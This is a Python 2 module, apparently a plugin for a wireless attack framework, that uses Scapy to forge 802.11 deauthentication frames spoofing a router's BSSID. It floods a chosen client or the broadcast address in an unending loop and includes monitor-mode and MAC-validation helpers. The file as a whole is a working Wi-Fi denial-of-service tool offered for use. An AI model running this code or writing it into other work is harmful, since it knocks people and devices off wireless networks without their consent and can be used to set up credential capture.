
from __colors import colorsNPrints as col
import sys
import time

# to supress Scapy warning level
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *
# must be called main
class main:


	def __init__(self):
		self.name = "deauthenticate" #same as the fileName
		
		self.cmds = [] # future stuff


		#Dictionaries with Options like: {"OptionName", [1/0, "Description", "<empty> for user input or default value"]}
		# 1/0 weather its a required option or not
		self.options = {
						"Interface":[1, "Wlan Interface in Monitor Mode", "wlan0"],
						"TargetMAC":[0, "MAC Address of the Target", ""],
						"RouterBSSID":[1, "Bssid of the Targets Router", ""],
						"Broadcast":[0, "1=Broadcast 0=Target IP", "0"]
						}



	def run(self):
		"""
			Needed to run the Module
		"""
		conf.verb = 0
		iface = self.options["Interface"][2]

		if iface not in self.getInterfaces():
			print col.writeError("Interface is not valid")
			return -1

		elif not self.isMonitorMode(iface):
			print col.writeError("Interface is not in Monitor Mode")
			return -1
		conf.iface = iface

		self.craftDeauth()
		


	def craftDeauth(self):
		
		# if broadcast and != client:
		# -> only broadcast form router to all
		# if broadcast and client
		# -> only client
		# if !broadcast and client
		# -> only client
		# if !broadcast and !client
		# give error
		#

		## addr1=dst, addr2=src addr3=bssid

		broadcast = True if self.options["Broadcast"][2] == "1" else False
		routerBssid = self.options["RouterBSSID"][2].lower()
		clientMac = self.options["TargetMAC"][2].lower()
		broadcastAddr = "FF:FF:FF:FF:FF:FF".lower()



		if clientMac != "":
			if not self.isCorrectMac(clientMac):
				col.writeError("Wrong Client MAC")
		if routerBssid != "":
			if not self.isCorrectMac(routerBssid):
				col.writeError("Wrong Router bssid")

		if broadcast and clientMac == "" and routerBssid != "":
			# deauth packet from the Router to the Broadcast
			daPack = RadioTap() / Dot11(addr1=broadcastAddr, addr2=routerBssid, addr3=routerBssid) / Dot11Deauth()
			self.sendProc([daPack])

		elif broadcast and clientMac != "" and routerBssid != "":
			# send deauth from router to client and from client to router and broadcast
			daPackR2C = RadioTap() / Dot11(addr1=clientMac, addr2=routerBssid, addr3=routerBssid) / Dot11Deauth()
			daPack = RadioTap() / Dot11(addr1=broadcastAddr, addr2=routerBssid, addr3=routerBssid) / Dot11Deauth()

			self.sendProc([daPack, daPackR2C])

		elif not broadcast and clientMac != "" and routerBssid != "":
			daPackR2C = RadioTap() / Dot11(addr1=clientMac, addr2=routerBssid, addr3=routerBssid) / Dot11Deauth()
			self.sendProc([daPackR2C])

		else:
			print col.writeError("set the correct Options")


	def sendProc(self, pcktLst):
		"""
			Send the deauth Packets (in 64s bursts)
		"""
		sys.stdout.write("[" + " "*68 + "]")
		try:
			while True:
				for i in range(0, 64):
					for f in pcktLst:
						sendp(f, verbose=0) # Layer 2 send
						pass
					#time.sleep(.01)
					s = "[" + "="*i+" "*(63-i)+">"*(1 if i==63 else 0) + " "*(1 if i!=63 else 0) + "]  Sending Packet: " + str(i+1)
					sys.stdout.write(s)
					
					# clear the line
					
					CURSOR_UP_ONE = '\x1b[1A'
					CURSORDOWN = '\x1b[1B'
					ERASE_LINE = '\x1b[1M'
					print CURSOR_UP_ONE + ERASE_LINE
					#sys.stdout.write(ERASE_LINE)
				print 
				time.sleep(.5)
				

		except KeyboardInterrupt:
			pass
		print


	def isCorrectMac(self, mac):
		"""
			Check if the Mac is possible
		"""
		
		if len(mac) != 17:
			return False
		elif len([False for i in [f for f in mac] if i not in "ABCDEF0123456789:"]) > 0:
			return False
		else:
			return True


	def getInterfaces(self):
		"""
			get the interfaces from "ifconfig" with regex and return them in a list
		"""
		output = subprocess.Popen('ifconfig', stdout=subprocess.PIPE).communicate()[0]
		interfaces = [f.replace(": ","") for f in re.findall("^[a-zA-Z0-9]+: ", output, re.MULTILINE)]
		return interfaces

	def isMonitorMode(self, iface):

		output = subprocess.Popen('iwconfig', stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]
		modeBlock = output[output.find(iface)::].split("\n")
		mode = ""
		
		for line in modeBlock:
			if "Mode:" in line:
				mode = re.findall("Mode:[a-zA-Z]+  ", line)[0].replace("Mode:", "").replace(" ", "")
		
		if mode == "Monitor":
			return True
		return False

	# to set the Options
	# could be left like that
	def setOption(self, key, value):
		for k, v in self.options.iteritems():
			if k == key:
				v[2] = value